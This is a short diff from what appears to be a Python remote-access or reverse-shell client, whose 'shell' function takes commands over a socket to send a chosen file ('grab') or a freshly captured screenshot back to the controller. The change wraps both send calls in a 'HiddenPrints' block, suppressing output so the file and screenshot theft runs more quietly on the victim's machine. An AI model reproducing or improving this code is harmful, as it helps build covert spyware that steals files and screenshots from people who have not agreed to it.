@@ -74,7 +74,8 @@ def shell(mySocket):
         elif 'grab' == commandList[0]:
             path = " ".join(commandList[1:])
             try:
-                sendFile(mySocket, path)
+                with HiddenPrints():
+                    sendFile(mySocket, path)
             except FileNotFoundError:
                 mySocket.send('File not found'.encode())
             except Exception as e:
@@ -89,7 +90,8 @@ def shell(mySocket):
                 fullPath = os.path.join(tempPath, fileName)
 
                 ImageGrab.grab().save(fullPath, "JPEG")
-                sendFile(mySocket, fullPath)
+                with HiddenPrints():
+                    sendFile(mySocket, fullPath)
                 shutil.rmtree(tempPath)
             except Exception as e:
                 mySocket.send('ERROR'.encode())
